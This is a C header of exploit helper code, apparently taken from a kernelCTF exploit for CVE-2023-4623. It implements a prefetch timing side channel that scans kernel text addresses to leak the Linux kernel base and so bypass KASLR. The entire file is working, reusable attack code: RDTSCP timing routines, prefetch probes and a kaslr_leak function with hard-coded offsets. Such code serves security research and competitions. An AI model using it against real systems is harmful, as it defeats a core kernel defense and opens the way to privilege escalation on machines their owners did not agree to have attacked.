#ifndef PWN_LEAKS_H
#define PWN_LEAKS_H

// v1: https://github.com/google/security-research/blob/af4dba58277868912c9580253ddf9cee0073f716/pocs/linux/kernelctf/CVE-2023-4623_lts_cos/exploit/cos-97-16919.353.23/exploit.c
/* Prefetch kaslr leak */
#define MIN_STEXT 0xffffffff81000000
#define MAX_STEXT 0xffffffffbb000000
#define BASE_INC 0x1000000
#define SYS_GETUID 0x1a7440

/*
 * Prefetch timing code from Daniel Gruss.
 * https://github.com/IAIK/prefetch
 */

inline __attribute__((always_inline)) size_t rdtsc_begin () {
  size_t a, d;
  asm volatile (
    "mfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "xor %%rax, %%rax\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

inline __attribute__((always_inline)) size_t rdtsc_end () {
  size_t a, d;
  asm volatile(
    "xor %%rax, %%rax\n\t"
    "mfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

void prefetch (void* p) {
    asm volatile ("prefetchnta (%0)" : : "r" (p));
    asm volatile ("prefetcht2 (%0)" : : "r" (p));
}

size_t onlyreload (void* addr) {
    size_t time = rdtsc_begin();
    prefetch(addr);
    size_t delta = rdtsc_end() - time;
    return delta;
}

/*
 * Simple implementation of prefetch sidechannel to
 * bypass KASLR.
 */

size_t kaslr_leak (int tries1, int tries2) {
    size_t base = -1, addr;
    size_t time;
    size_t min = -1;

    addr = 0xffffffff80000000;
    for (int i = 0; i < tries1; i++) {
        time = onlyreload((void*)addr);
        min = min < time ? min : time;
    }

    for (int i = 0; i < tries2; i++) {
        for (addr = MIN_STEXT; addr <= MAX_STEXT; addr += BASE_INC) {
            time = onlyreload((void*)(addr + SYS_GETUID));
            if (time < min && addr < base) {
                base = addr;
            }
        }
    }
    return base;
}

#endif